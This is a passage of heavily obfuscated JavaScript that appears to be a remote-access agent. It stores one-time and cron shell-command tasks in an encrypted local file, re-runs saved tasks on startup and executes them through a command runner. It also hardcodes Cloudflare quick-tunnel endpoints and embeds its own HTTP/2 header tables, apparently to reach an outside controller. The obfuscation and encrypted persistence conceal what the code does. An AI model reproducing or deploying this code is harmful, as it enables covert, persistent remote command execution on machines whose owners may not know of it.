            const r = q['name'][f2(0xa6e)](/\\/g, '/');
            if (j[f2(0xed)]) {
                const v = r[f2(0xbb0)]('/')[f2(0x3ff)]();
                if (!j['includes'](r) && !j['includes'](v)) {
                    l++;
                    continue;
                }
            }
            if (q[f2(0x821)] || q[f2(0x6a4)] || f[f2(0xb31)](f[f2(0x395)](m, q[f2(0x677)]), a0af['ZIP_MAX_TOTAL_BYTES'])) {
                l++;
                continue;
            }
            const s = a0o['resolve'](h, r), t = a0o['relative'](h, s);
            if (t[f2(0xc9b)]('..') || a0o['isAbsolute'](t)) {
                l++;
                continue;
            }
            if (!f[f2(0x101)](a0ae, s)) {
                l++;
                continue;
            }
            let u;
            try {
                u = a0af[f2(0xa7d)](q);
            } catch (w) {
                l++;
                continue;
            }
            if (a0af[f2(0xb16)](u) !== q[f2(0x4b6)]) {
                l++;
                continue;
            }
            if (!c && a0l[f2(0x8d6)](s)) {
                l++;
                continue;
            }
            try {
                a0l[f2(0x4a9)](a0o[f2(0x651)](s), { 'recursive': !![] }), a0l[f2(0x134)](s, u);
            } catch (x) {
                l++;
                continue;
            }
            k++, m += q[f2(0x677)], f['kchHu'](n['length'], a0af[f2(0x35e)]) ? n[f2(0x77f)](a0ag[f2(0x4cb)](s)) : o = !![];
        }
        return {
            'status': 'ok',
            'path': a0ag[f2(0x4cb)](g),
            'dest': a0ag[f2(0x4cb)](h),
            'extracted': k,
            'skipped': l,
            'files': n,
            'files_truncated': o
        };
    }
}
class a0ah {
    static [a0ch(0x759)] = a0ch(0x341);
    static [a0ch(0xd01)] = 0x1;
    static [a0ch(0x22b)] = {
        'enabled': ![],
        'locked': ![],
        'path': null,
        'key': null,
        'lastSavedAt': null
    };
    static ['homeDir']() {
        const f3 = a0ch;
        for (const a of [
                process.env.USERPROFILE,
                process.env.HOME
            ]) {
            if (a && a0l['existsSync'](a))
                return a;
        }
        try {
            return a0p[f3(0xc80)]() || process[f3(0x72b)]();
        } catch (b) {
            return process['cwd']();
        }
    }
    static [a0ch(0x753)](a) {
        const f4 = a0ch, b = {
                'owcqj': f4(0x26f),
                'MNjtT': function (c, d) {
                    return c === d;
                },
                'mzXJC': f4(0xd18)
            };
        if (!a)
            return null;
        try {
            if (/^[0-9a-fA-F]{64}$/[f4(0x8d7)](a)) {
                const d = Buffer[f4(0x8c2)](a, b[f4(0xc44)]);
                return b['MNjtT'](d[f4(0xed)], 0x20) ? d : null;
            }
            if (!/^[A-Za-z0-9+/]+={0,2}$/['test'](a))
                return null;
            const c = Buffer[f4(0x8c2)](a, b[f4(0xbbe)]);
            return b[f4(0xb25)](c[f4(0xed)], 0x20) ? c : null;
        } catch (f) {
            return null;
        }
    }
    static [a0ch(0x994)]() {
        const f5 = a0ch, a = {
                'uHlZi': f5(0x6bc),
                'vXSrg': f5(0x94e),
                'tUnWa': f5(0x5aa),
                'vkEvJ': f5(0xc12),
                'EAgWl': f5(0xbb9),
                'zzctO': f5(0x8f3),
                'mWQJf': f5(0x74d)
            }, b = a0ah[f5(0x22b)];
        let c = (process.env.KSTORE || '')[f5(0x40e)]();
        if ([
                a[f5(0x1b7)],
                '0',
                a[f5(0xccb)],
                a[f5(0xcb8)]
            ][f5(0x659)](c['toLowerCase']()))
            return a0P[f5(0x1b1)](a['vkEvJ']), b;
        const d = (process.env.KSTORE_KEY || '')['trim']();
        !c && (c = a0o['join'](a0ah[f5(0xbd1)](), f5(0x2bb), a[f5(0xcc0)]));
        const f = a0ah[f5(0x753)](d);
        if (!f) {
            if (d)
                a0P[f5(0xb4f)](a[f5(0x9df)]);
            else
                a0P['info'](a[f5(0x65a)]);
            return b;
        }
        return b['path'] = c, b[f5(0x62f)] = f, b[f5(0x9fe)] = !![], a0P[f5(0x1b1)](f5(0x18d) + b[f5(0x4ac)]), b;
    }
    static [a0ch(0x174)](a, b) {
        const f6 = a0ch, c = {
                'QWccm': f6(0xd18),
                'XEIIw': f6(0xc74)
            }, d = a0k[f6(0x863)](0xc), f = a0k[f6(0x31d)](f6(0x3c6), a, d), g = Buffer[f6(0x653)]([
                f['update'](Buffer['from'](b, 'utf8')),
                f['final']()
            ]), h = {
                'nonce': d[f6(0x1d9)](c['QWccm']),
                'tag': f['getAuthTag']()[f6(0x1d9)]('base64'),
                'ciphertext': g[f6(0x1d9)](c[f6(0x373)])
            };
        return Buffer[f6(0x8c2)](JSON[f6(0x70a)](h), c[f6(0x812)])[f6(0x1d9)](c[f6(0x373)]);
    }
    static ['decrypt'](a, b) {
        const f7 = a0ch, c = {
                'VrBzB': f7(0xd18),
                'TmIHG': f7(0xc74),
                'URuyH': f7(0x68c),
                'snECp': f7(0x3c6)
            }, d = JSON[f7(0x418)](Buffer[f7(0x8c2)](b, c['VrBzB'])[f7(0x1d9)](c[f7(0xc21)]));
        if (!d[f7(0x183)] || !d[f7(0x17e)] || !d[f7(0xbf2)])
            throw new Error(c[f7(0x6b5)]);
        const f = a0k[f7(0x191)](c[f7(0x534)], a, Buffer['from'](d[f7(0x183)], f7(0xd18)));
        return f[f7(0x13e)](Buffer['from'](d[f7(0x17e)], c[f7(0x382)])), Buffer['concat']([
            f[f7(0xd44)](Buffer[f7(0x8c2)](d[f7(0xbf2)], c[f7(0x382)])),
            f['final']()
        ])[f7(0x1d9)](c[f7(0xc21)]);
    }
    static ['load']() {
        const f8 = a0ch, a = {
                'HDhpa': 'utf8',
                'OygSp': function (c, d) {
                    return c !== d;
                },
                'aBrUu': f8(0x550),
                'mNysm': function (c, d, f) {
                    return c(d, f);
                },
                'NXqOw': function (c, d) {
                    return c > d;
                },
                'VlHju': function (c, d) {
                    return c !== d;
                }
            }, b = a0ah['state'];
        if (!b[f8(0x9fe)])
            return {
                'onetasks': [],
                'crontasks': {}
            };
        try {
            if (!a0l[f8(0x8d6)](b[f8(0x4ac)]))
                return {
                    'onetasks': [],
                    'crontasks': {}
                };
            const c = a0l[f8(0x8fc)](b['path'], a[f8(0x177)])[f8(0x40e)]();
            if (!c)
                return {
                    'onetasks': [],
                    'crontasks': {}
                };
            let d;
            try {
                d = JSON[f8(0x418)](a0ah[f8(0x89b)](b['key'], c));
            } catch (j) {
                throw new Error(f8(0xbd0) + j[f8(0x8f9)]);
            }
            if (!d || a[f8(0xb66)](d['magic'], a0ah[f8(0x759)]))
                throw new Error(a[f8(0xa94)]);
            const f = a[f8(0x288)](parseInt, d[f8(0xa8d)], 0xa) || 0x0;
            if (a[f8(0xbc3)](f, a0ah['VERSION']))
                return b['locked'] = !![], a0P[f8(0xb4f)]('[TaskStore]\x20❌\x20存储版本\x20' + f + f8(0x67c) + a0ah[f8(0xd01)] + f8(0x8f5)), {
                    'onetasks': [],
                    'crontasks': {}
                };
            if (a[f8(0xade)](f, a0ah[f8(0xd01)]))
                throw new Error(f8(0xd3e) + f);
            const g = d['data'] || {};
            b[f8(0xbca)] = d[f8(0x7dc)] || null;
            const h = Array['isArray'](g[f8(0x5e9)]) ? g[f8(0x5e9)][f8(0x51f)](String) : [], i = {};
            for (const [l, m] of Object[f8(0x1e9)](g['crontasks'] || {}))
                i[String(l)] = String(m);
            return a0P[f8(0x1b1)](f8(0xb9f) + h[f8(0xed)] + f8(0x1db) + Object['keys'](i)[f8(0xed)]), {
                'onetasks': h,
                'crontasks': i
            };
        } catch (n) {
            return a0ah[f8(0xbdc)](f8(0x756) + n[f8(0x8f9)]), {
                'onetasks': [],
                'crontasks': {}
            };
        }
    }
    static [a0ch(0xbdc)](a) {
        const f9 = a0ch;
        try {
            const b = a0ah[f9(0x22b)];
            if (b[f9(0x4ac)] && a0l[f9(0x8d6)](b[f9(0x4ac)])) {
                const c = b[f9(0x4ac)] + f9(0x468) + Date[f9(0x156)]();
                a0l[f9(0x6e0)](b['path'], c), a0P[f9(0xb4f)](f9(0x4b8) + a + f9(0x1b0) + c);
            } else
                a0P[f9(0xb4f)]('[TaskStore]\x20❌\x20' + a);
        } catch (d) {
            a0P[f9(0xb4f)](f9(0x4b8) + a + ',\x20且隔离失败:\x20' + d[f9(0x8f9)]);
        }
    }
    static [a0ch(0x86a)](a, b) {
        const fa = a0ch, c = { 'KRbwt': fa(0xc74) }, d = a0ah[fa(0x22b)];
        if (!d[fa(0x9fe)] || d[fa(0x7d9)])
            return ![];
        let f = null;
        try {
            const g = {
                    'magic': a0ah[fa(0x759)],
                    'version': a0ah[fa(0xd01)],
                    'saved_at': new Date()[fa(0x774)]()[fa(0xa6e)](/\.\d+Z$/, 'Z'),
                    'data': {
                        'onetasks': a || [],
                        'crontasks': b || {}
                    }
                }, h = a0ah[fa(0x174)](d[fa(0x62f)], JSON[fa(0x70a)](g));
            return a0l['mkdirSync'](a0o['dirname'](d[fa(0x4ac)]), { 'recursive': !![] }), f = d[fa(0x4ac)] + fa(0xbde) + process[fa(0x709)], a0l[fa(0x134)](f, h, c[fa(0x3ad)]), a0l[fa(0x6e0)](f, d[fa(0x4ac)]), d['lastSavedAt'] = g[fa(0x7dc)], !![];
        } catch (i) {
            a0P['error'](fa(0xcc6) + i[fa(0x8f9)]);
            try {
                if (f && a0l[fa(0x8d6)](f))
                    a0l[fa(0xb05)](f);
            } catch (j) {
            }
            return ![];
        }
    }
}
class a0ai {
    static [a0ch(0x926)] = new Map();
    static [a0ch(0x1bb)](a, b) {
        const fb = a0ch;
        a[fb(0x77f)](b), a[fb(0xed)] > a0a1[fb(0x209)] && a['splice'](0x0, a[fb(0xed)] - a0a1['MAX_TASK_LOG_SIZE']);
    }
    static [a0ch(0xf7)](a, b, c, d, f = null) {
        const fc = a0ch, g = new Date()[fc(0x774)]();
        return {
            'ts': g,
            'cmd': a,
            'output': b,
            'exitcode': c,
            'type': d,
            'cron': f,
            'formatted': g + fc(0x422) + a + fc(0x509) + c + '\x0a' + (b?.[fc(0x40e)]() || '')
        };
    }
    static [a0ch(0x9ae)]() {
        const fd = a0ch;
        return {
            'status': 'ok',
            'count': a0a1['onetasks'][fd(0xed)],
            'tasks': a0a1[fd(0x5e9)]
        };
    }
    static [a0ch(0x980)] = /^\s*(?:#|rem\b)\s*kisama-task:\s*(.*)$/i;
    static [a0ch(0x72d)](a) {
        const fe = a0ch, b = {
                'xYLjF': function (d, f) {
                    return d ?? f;
                },
                'VMljS': function (d, f) {
                    return d(f);
                }
            }, c = String(b[fe(0x435)](a, ''))[fe(0xbb0)]('\x0a')[fe(0x88a)](0x0, 0x3);
        for (const d of c) {
            const f = a0ai['taskMetaLineRe'][fe(0xd03)](d);
            if (!f)
                continue;
            const g = /\bid=(\d+)\b/[fe(0xd03)](f[0x1])?.[0x1];
            if (!g)
                return null;
            const h = b[fe(0x781)](Number, /\bupdated=(\d+)\b/[fe(0xd03)](f[0x1])?.[0x1] || 0x0);
            return {
                'id': g,
                'updated': h
            };
        }
        return null;
    }
    static [a0ch(0x3a3)](a) {
        const ff = a0ch, b = {
                'IiFCd': function (d, f) {
                    return d(f);
                },
                'IiVzQ': function (d, f) {
                    return d < f;
                },
                'CxWKW': function (d, f) {
                    return d + f;
                },
                'CddYK': function (d, f) {
                    return d ?? f;
                }
            }, c = b[ff(0x15f)](String, a ?? '')[ff(0xbb0)]('\x0a');
        for (let d = 0x0; b[ff(0x3ee)](d, Math['min'](0x3, c[ff(0xed)])); d++) {
            if (a0ai[ff(0x980)][ff(0x8d7)](c[d]))
                return [
                    ...c[ff(0x88a)](0x0, d),
                    ...c[ff(0x88a)](b[ff(0x42b)](d, 0x1))
                ][ff(0xaa7)]('\x0a');
        }
        return String(b['CddYK'](a, ''));
    }
    static [a0ch(0xacf)](a, b, c) {
        const fg = a0ch, d = {
                'Ngkks': function (j, k) {
                    return j === k;
                },
                'OTsJQ': fg(0x29d)
            }, f = a0ai[fg(0x3a3)](a), g = d[fg(0x70e)](process['platform'], d['OTsJQ']) ? fg(0xb34) : '#', h = g + fg(0x803) + b + '\x20updated=' + c, i = f[fg(0xbb0)]('\x0a');
        return i[fg(0x67f)](i[0x0]?.[fg(0xc9b)]('#!') ? 0x1 : 0x0, 0x0, h), i[fg(0xaa7)]('\x0a');
    }
    static [a0ch(0x86b)](a, b) {
        const fh = a0ch, c = {
                'KpdcU': function (j, k) {
                    return j < k;
                },
                'GjFcf': function (j, k) {
                    return j(k);
                },
                'DKVpB': function (j, k) {
                    return j === k;
                },
                'ydqti': function (j, k) {
                    return j(k);
                }
            }, d = Date[fh(0x156)](), f = j => (j || [])['map'](k => ({
                'raw': String(k ?? ''),
                'meta': a0ai['parseTaskMeta'](k),
                'eff': a0ai[fh(0x3a3)](k)[fh(0x40e)]()
            })), g = f(b), h = new Set(), i = [];
        for (const {
                    raw: j,
                    meta: k,
                    eff: l
                } of f(a)) {
            let m = -0x1;
            k && (m = g['findIndex']((p, q) => !h[fh(0x286)](q) && p[fh(0x9d2)] && p[fh(0x9d2)]['id'] === k['id']));
            c[fh(0x2b3)](m, 0x0) && (m = g['findIndex']((p, q) => !h[fh(0x286)](q) && p[fh(0x701)] === l && (!k || !p[fh(0x9d2)])));
            if (c['KpdcU'](m, 0x0)) {
                i['push'](a0ai[fh(0xacf)](l, c[fh(0xabc)](String, d), d));
                continue;
            }
            const n = g[m];
            h[fh(0x84a)](m);
            if (c[fh(0x7e5)](n[fh(0x701)], l)) {
                n[fh(0x9d2)] ? i['push'](a0ai[fh(0xacf)](n[fh(0x424)], n[fh(0x9d2)]['id'], n['meta'][fh(0x564)])) : i[fh(0x77f)](a0ai[fh(0xacf)](n[fh(0x424)], k ? k['id'] : c[fh(0x678)](String, d), k && k['updated'] ? k[fh(0x564)] : d));
                continue;
            }
            const o = n[fh(0x9d2)] ? n['meta']['id'] : k ? k['id'] : c[fh(0xabc)](String, d);
            i[fh(0x77f)](a0ai[fh(0xacf)](l, o, d));
        }
        return i;
    }
    static [a0ch(0x710)](a, b) {
        const fi = a0ch, c = {
                'QJIgt': function (j, k) {
                    return j < k;
                },
                'VSloP': function (j, k) {
                    return j < k;
                },
                'lGuIA': function (j, k) {
                    return j(k);
                },
                'MgvIK': function (j, k) {
                    return j === k;
                },
                'wYQqb': function (j, k) {
                    return j(k);
                }
            }, d = Date[fi(0x156)](), f = ([j, k]) => ({
                'expr': String(j),
                'raw': String(k ?? ''),
                'meta': a0ai[fi(0x72d)](k),
                'eff': a0ai[fi(0x3a3)](k)[fi(0x40e)]()
            }), g = Object[fi(0x1e9)](b || {})[fi(0x51f)](f), h = new Set(), i = {};
        for (const {
                    expr: j,
                    raw: k,
                    meta: l,
                    eff: m
                } of Object[fi(0x1e9)](a || {})[fi(0x51f)](f)) {
            let n = -0x1;
            l && (n = g[fi(0xc96)]((q, r) => !h['has'](r) && q[fi(0x9d2)] && q[fi(0x9d2)]['id'] === l['id']));
            c['QJIgt'](n, 0x0) && (n = g[fi(0xc96)]((q, r) => !h[fi(0x286)](r) && q['expr'] === j && q['eff'] === m && (!l || !q[fi(0x9d2)])));
            if (c['VSloP'](n, 0x0)) {
                i[j] = a0ai['withTaskMeta'](m, c[fi(0x5b3)](String, d), d);
                continue;
            }
            const o = g[n];
            h[fi(0x84a)](n);
            if (c[fi(0x662)](o[fi(0x701)], m) && c[fi(0x662)](o[fi(0x4d3)], j)) {
                o[fi(0x9d2)] ? i[j] = a0ai['withTaskMeta'](o[fi(0x424)], o[fi(0x9d2)]['id'], o['meta'][fi(0x564)]) : i[j] = a0ai[fi(0xacf)](o[fi(0x424)], l ? l['id'] : c[fi(0x5b3)](String, d), l && l[fi(0x564)] ? l[fi(0x564)] : d);
                continue;
            }
            const p = o[fi(0x9d2)] ? o['meta']['id'] : l ? l['id'] : c[fi(0x982)](String, d);
            i[j] = a0ai[fi(0xacf)](m, p, d);
        }
        return i;
    }
    static async ['setOnetimeTasks'](a) {
        const fj = a0ch, b = {
                'ePLIH': function (d, f) {
                    return d > f;
                },
                'UspzT': function (d, f) {
                    return d > f;
                },
                'qDUMh': fj(0x51b),
                'GEXdR': function (d, f) {
                    return d === f;
                },
                'aoWhl': fj(0xb4f)
            };
        a0a1[fj(0x5e9)] = a && b[fj(0x74a)](a['length'], 0x0) ? a0ai['normalizeOnetimeTasks'](a, a0a1['onetasks']) : [];
        const c = [];
        if (a0a1[fj(0xc57)] && b[fj(0x18e)](a0a1[fj(0x5e9)][fj(0xed)], 0x0)) {
            for (let d = 0x0; d < a0a1['onetasks'][fj(0xed)]; d++) {
                const f = a0a1['onetasks'][d], g = await a0ad['execute'](f), h = this['_formatLogEntry'](f, g[fj(0x2e5)], g[fj(0xcb9)], b[fj(0x989)]);
                this[fj(0x1bb)](a0a1['onetimetasks_log'], h), c[fj(0x77f)]({
                    'index': d,
                    'cmd': f,
                    'exitcode': g[fj(0xcb9)],
                    'output': g[fj(0x2e5)],
                    'status': b['GEXdR'](g[fj(0xcb9)], 0x0) ? 'ok' : b[fj(0x6c7)]
                });
            }
            a0a1[fj(0xc57)] = ![];
        }
        return {
            'status': 'ok',
            'count': a0a1['onetasks'][fj(0xed)],
            'tasks': a0a1[fj(0x5e9)],
            'executed': c,
            'persisted': a0ah[fj(0x86a)](a0a1[fj(0x5e9)], a0a1[fj(0xa3e)])
        };
    }
    static [a0ch(0x16d)]() {
        const fk = a0ch;
        return {
            'status': 'ok',
            'count': Object['keys'](a0a1[fk(0xa3e)])[fk(0xed)],
            'tasks': a0a1[fk(0xa3e)]
        };
    }
    static [a0ch(0x475)](a) {
        const fl = a0ch, b = {
                'XNbtb': function (d, f) {
                    return d === f;
                },
                'smgPB': fl(0x686),
                'osYCz': 'cron',
                'dOTpe': fl(0xb4f),
                'pcUnz': function (d, f) {
                    return d - f;
                },
                'eAzrZ': function (d, f) {
                    return d > f;
                },
                'reFtn': function (d, f) {
                    return d > f;
                }
            };
        this[fl(0x926)][fl(0x525)](d => {
            const fm = fl;
            b[fm(0x21c)](typeof d['stop'], b['smgPB']) && d[fm(0xb00)](), b[fm(0x21c)](typeof d['destroy'], b[fm(0xa76)]) && d[fm(0x3d8)]();
        }), this['cronJobs']['clear']();
        const c = [];
        for (const d of Object[fl(0x2a2)](a || {})) {
            !a0t[fl(0x790)](d) && c['push'](d);
        }
        if (c['length'] > 0x0)
            return {
                'status': b['dOTpe'],
                'message': 'Invalid\x20cron\x20expressions:\x20' + c[fl(0xaa7)](',\x20'),
                'valid_count': b[fl(0x1ab)](Object['keys'](a || {})[fl(0xed)], c[fl(0xed)])
            };
        a0a1[fl(0xa3e)] = a && b[fl(0x796)](Object[fl(0x2a2)](a)[fl(0xed)], 0x0) ? a0ai['normalizeCronTasks'](a, a0a1['crontasks']) : {};
        for (const [f, g] of Object[fl(0x1e9)](a0a1['crontasks'])) {
            const h = a0t[fl(0x901)](f, async () => {
                const fn = fl, i = await a0ad[fn(0xa64)](g), j = this[fn(0xf7)](g, i[fn(0x2e5)], i[fn(0xcb9)], b[fn(0x1c0)], f);
                this[fn(0x1bb)](a0a1['crontasks_log'], j);
            });
            this[fl(0x926)][fl(0xb80)](f, h);
        }
        return a0a1['cronloop'] = b['reFtn'](Object[fl(0x2a2)](a0a1[fl(0xa3e)])['length'], 0x0), {
            'status': 'ok',
            'count': Object[fl(0x2a2)](a0a1[fl(0xa3e)])[fl(0xed)],
            'tasks': a0a1[fl(0xa3e)],
            'persisted': a0ah[fl(0x86a)](a0a1[fl(0x5e9)], a0a1['crontasks'])
        };
    }
    static [a0ch(0x35b)]() {
        const fo = a0ch;
        return {
            'onetime': {
                'pending': a0a1[fo(0xc57)],
                'count': a0a1['onetasks']['length']
            },
            'cron': {
                'active': a0a1[fo(0xa5f)],
                'count': Object['keys'](a0a1[fo(0xa3e)])['length'],
                'check_interval': a0a1[fo(0xc48)]
            },
            'persistence': {
                'enabled': a0ah[fo(0x22b)][fo(0x9fe)],
                'store_path': a0ah[fo(0x22b)][fo(0x4ac)],
                'last_saved_at': a0ah[fo(0x22b)][fo(0xbca)]
            }
        };
    }
    static [a0ch(0xa12)](a = 0x32) {
        const fp = a0ch, b = a0a1['onetimetasks_log']['slice'](-a);
        return {
            'status': 'ok',
            'count': b[fp(0xed)],
            'logs': b
        };
    }
    static ['getCronLogs'](a = 0x32) {
        const fq = a0ch, b = a0a1[fq(0x57a)]['slice'](-a);
        return {
            'status': 'ok',
            'count': b[fq(0xed)],
            'logs': b
        };
    }
    static [a0ch(0x9e5)]() {
        const fr = a0ch, a = { 'iroSl': 'onetime' }, b = a0a1[fr(0x114)]['length'];
        return a0a1[fr(0x114)] = [], {
            'status': 'ok',
            'cleared': a[fr(0x46f)]
        };
    }
    static [a0ch(0x1aa)]() {
        const ft = a0ch, a = { 'YpwPJ': ft(0x773) }, b = a0a1['crontasks_log'][ft(0xed)];
        return a0a1[ft(0x57a)] = [], {
            'status': 'ok',
            'cleared': a['YpwPJ']
        };
    }
    static [a0ch(0x1de)]() {
        const fu = a0ch, a = {
                'ccltD': function (g, h) {
                    return g - h;
                },
                'NJxvw': function (g, h) {
                    return g - h;
                }
            }, b = a0a1[fu(0x114)][fu(0x29a)](g => g['exitcode'] === 0x0)[fu(0xed)], c = a[fu(0xc6d)](a0a1['onetimetasks_log'][fu(0xed)], b), d = a0a1[fu(0x57a)][fu(0x29a)](g => g['exitcode'] === 0x0)[fu(0xed)], f = a[fu(0x716)](a0a1['crontasks_log']['length'], d);
        return {
            'onetime': {
                'total_logged': a0a1[fu(0x114)][fu(0xed)],
                'max_capacity': a0a1[fu(0x209)],
                'recent_success': b,
                'recent_failed': c
            },
            'cron': {
                'total_logged': a0a1[fu(0x57a)][fu(0xed)],
                'max_capacity': a0a1['MAX_TASK_LOG_SIZE'],
                'recent_success': d,
                'recent_failed': f
            }
        };
    }
    static async [a0ch(0x3a0)]() {
        const fv = a0ch, a = { 'wyIEk': 'onetime' }, b = [];
        for (let c = 0x0; c < a0a1[fv(0x5e9)][fv(0xed)]; c++) {
            const d = a0a1[fv(0x5e9)][c], f = await a0ad[fv(0xa64)](d), g = this['_formatLogEntry'](d, f[fv(0x2e5)], f[fv(0xcb9)], a['wyIEk']);
            this[fv(0x1bb)](a0a1[fv(0x114)], g), b[fv(0x77f)]({
                'cmd': d,
                'exitcode': f[fv(0xcb9)],
                'output': f['result'],
                'timeout': f[fv(0xb37)]
            });
        }
        return a0a1[fv(0xc57)] = ![], {
            'status': 'ok',
            'executed': b['length'],
            'results': b
        };
    }
    static [a0ch(0x809)]() {
        const fw = a0ch, a = {
                'cAyZf': function (c, d) {
                    return c > d;
                },
                'qggHb': function (c, d) {
                    return c > d;
                }
            };
        a0ah['init']();
        const b = a0ah[fw(0x9bf)]();
        b['onetasks'][fw(0xed)] > 0x0 && (a0a1['onetasks'] = b[fw(0x5e9)]);
        if (a[fw(0x808)](Object[fw(0x2a2)](b[fw(0xa3e)])[fw(0xed)], 0x0))
            try {
                a0ai[fw(0x475)](b[fw(0xa3e)]);
            } catch (c) {
                a0P['error'](fw(0x6fc) + c[fw(0x8f9)]);
            }
        a['qggHb'](a0a1[fw(0x5e9)][fw(0xed)], 0x0) && a0a1[fw(0xc57)] && a0ai[fw(0x3a0)]()[fw(0x818)](d => a0P['error'](fw(0x4fd) + d[fw(0x8f9)]));
    }
}
const a0aj = 'https://api.trycloudflare.com', a0ak = ((() => {
        const fx = a0ch, a = {
                'zkkQC': function (c, d) {
                    return c > d;
                },
                'rpEKN': fx(0x5f7),
                'qFXPD': 'region2.v2.argotunnel.com'
            }, b = String(process.env.KISAMA_EDGE_HOSTS || '')[fx(0xbb0)](',')[fx(0x51f)](c => c[fx(0x40e)]())[fx(0x29a)](Boolean);
        return a[fx(0xcea)](b[fx(0xed)], 0x0) ? b : [
            a[fx(0x20e)],
            a[fx(0x983)]
        ];
    })()), a0al = 0x1ea4, a0am = a0ch(0x6eb), a0an = a0ch(0x3b5), a0ao = 0x4000, a0ap = [
        [
            a0ch(0x8dc),
            ''
        ],
        [
            a0ch(0xaca),
            a0ch(0x11f)
        ],
        [
            ':method',
            'POST'
        ],
        [
            a0ch(0x86d),
            '/'
        ],
        [
            ':path',
            a0ch(0xbe2)
        ],
        [
            ':scheme',
            a0ch(0xc50)
        ],
        [
            ':scheme',
            a0ch(0x481)
        ],
        [
            a0ch(0xa7c),
            a0ch(0x7f2)
        ],
        [
            a0ch(0xa7c),
            a0ch(0x20a)
        ],
        [
            a0ch(0xa7c),
            a0ch(0x8ee)
        ],
        [
            a0ch(0xa7c),
            a0ch(0x132)
        ],
        [
            a0ch(0xa7c),
            '400'
        ],
        [
            a0ch(0xa7c),
            '404'
        ],
        [
            a0ch(0xa7c),
            '500'
        ],
        [
            a0ch(0x6de),
            ''
        ],
        [
            a0ch(0x766),
            a0ch(0xc09)
        ],
        [
            a0ch(0xac3),
            ''
        ],
        [
            'accept-ranges',
            ''
        ],
        [
            'accept',
            ''
        ],
        [
            a0ch(0x94b),
            ''
        ],
        [
            a0ch(0x970),
            ''
        ],
        [
            a0ch(0xa91),
            ''
        ],
        [
            'authorization',
            ''
        ],
        [
            a0ch(0xcdb),
            ''
        ],
        [
            'content-disposition',
            ''
        ],
        [
            'content-encoding',
            ''
        ],
        [
            'content-language',
            ''
        ],
        [
            a0ch(0x36e),
            ''
        ],
        [
            'content-location',
            ''
        ],
        [
            a0ch(0xc22),
            ''
        ],
        [
            'content-type',
            ''
        ],
        [
            a0ch(0xba7),
            ''
        ],
        [
            a0ch(0xbb8),
            ''
        ],
        [
            a0ch(0x423),
            ''
        ],
        [
            a0ch(0xc02),
            ''
        ],
        [
            a0ch(0xa2b),
            ''
        ],
        [
            a0ch(0x8c2),
            ''
        ],
        [
            a0ch(0xab4),
            ''
        ],
        [
            'if-match',
            ''
        ],
        [
            'if-modified-since',
            ''
        ],
        [
            'if-none-match',
            ''
        ],
        [
            'if-range',
            ''
        ],
        [
            a0ch(0x672),
            ''
        ],
        [
            'last-modified',
            ''
        ],
        [
            a0ch(0x303),
            ''
        ],
        [
            a0ch(0x3df),
            ''
        ],
        [
            'max-forwards',
            ''
        ],
        [
            a0ch(0xafc),
            ''
        ],
        [
            'proxy-authorization',
            ''
        ],
        [
            a0ch(0xb47),
            ''
        ],
        [
            a0ch(0x849),
            ''
        ],
        [
            a0ch(0x751),
            ''
        ],
        [
            a0ch(0xbc6),
            ''
        ],
        [
            a0ch(0xb1e),
            ''
        ],
        [
            'set-cookie',
            ''
        ],
        [
            a0ch(0x2ec),
            ''
        ],
        [
            a0ch(0x91c),
            ''
        ],
        [
            a0ch(0x838),
            ''
        ],
        [
            a0ch(0x4c4),
            ''
        ],
        [
            a0ch(0x462),
            ''
        ],
        [
            a0ch(0xd5d),
            ''
        ]
    ], a0aq = [
        0x1ff8,
        0x7fffd8,
        0xfffffe2,
        0xfffffe3,
        0xfffffe4,
        0xfffffe5,
        0xfffffe6,
        0xfffffe7,
        0xfffffe8,
        0xffffea,
        0x3ffffffc,
        0xfffffe9,
        0xfffffea,
        0x3ffffffd,
        0xfffffeb,
        0xfffffec,
        0xfffffed,
        0xfffffee,
        0xfffffef,
        0xffffff0,
        0xffffff1,
        0xffffff2,
        0x3ffffffe,
        0xffffff3,
        0xffffff4,
        0xffffff5,
        0xffffff6,
        0xffffff7,
        0xffffff8,
        0xffffff9,
        0xffffffa,
        0xffffffb,
        0x14,
        0x3f8,
        0x3f9,
        0xffa,
        0x1ff9,
        0x15,
        0xf8,
        0x7fa,
        0x3fa,
        0x3fb,
        0xf9,
        0x7fb,
        0xfa,
        0x16,
        0x17,
        0x18,
        0x0,
        0x1,
        0x2,
        0x19,
        0x1a,
        0x1b,
        0x1c,
        0x1d,
        0x1e,
        0x1f,
        0x5c,
        0xfb,
        0x7ffc,
        0x20,
        0xffb,
        0x3fc,
        0x1ffa,
        0x21,
        0x5d,
        0x5e,
        0x5f,
        0x60,
        0x61,
        0x62,
        0x63,
        0x64,
        0x65,
        0x66,
        0x67,
        0x68,
        0x69,
        0x6a,
        0x6b,
        0x6c,
        0x6d,
        0x6e,
        0x6f,
        0x70,
        0x71,
        0x72,
        0xfc,
        0x73,
        0xfd,
        0x1ffb,
        0x7fff0,
        0x1ffc,
        0x3ffc,
        0x22,
        0x7ffd,
        0x3,
        0x23,
        0x4,
        0x24,
        0x5,
        0x25,
        0x26,
        0x27,
        0x6,
        0x74,
        0x75,
        0x28,
        0x29,
        0x2a,
        0x7,
        0x2b,
        0x76,
        0x2c,
        0x8,
        0x9,
        0x2d,
        0x77,
        0x78,
        0x79,
        0x7a,
        0x7b,
        0x7ffe,
        0x7fc,
        0x3ffd,
        0x1ffd,
        0xffffffc,
        0xfffe6,
        0x3fffd2,
        0xfffe7,
        0xfffe8,
        0x3fffd3,
        0x3fffd4,
        0x3fffd5,
        0x7fffd9,
        0x3fffd6,
        0x7fffda,
        0x7fffdb,
        0x7fffdc,
        0x7fffdd,
        0x7fffde,
        0xffffeb,
        0x7fffdf,
        0xffffec,
        0xffffed,
        0x3fffd7,
        0x7fffe0,
        0xffffee,
        0x7fffe1,
        0x7fffe2,
        0x7fffe3,
        0x7fffe4,
        0x1fffdc,
        0x3fffd8,
        0x7fffe5,
        0x3fffd9,
        0x7fffe6,
        0x7fffe7,
        0xffffef,
        0x3fffda,
        0x1fffdd,
        0xfffe9,
        0x3fffdb,
        0x3fffdc,
        0x7fffe8,
        0x7fffe9,
        0x1fffde,
        0x7fffea,
        0x3fffdd,
        0x3fffde,
        0xfffff0,
        0x1fffdf,
        0x3fffdf,
        0x7fffeb,
        0x7fffec,
        0x1fffe0,
        0x1fffe1,
        0x3fffe0,
        0x1fffe2,
        0x7fffed,
        0x3fffe1,
        0x7fffee,
        0x7fffef,
        0xfffea,
        0x3fffe2,
        0x3fffe3,
        0x3fffe4,
        0x7ffff0,
        0x3fffe5,
        0x3fffe6,
        0x7ffff1,
        0x3ffffe0,
        0x3ffffe1,
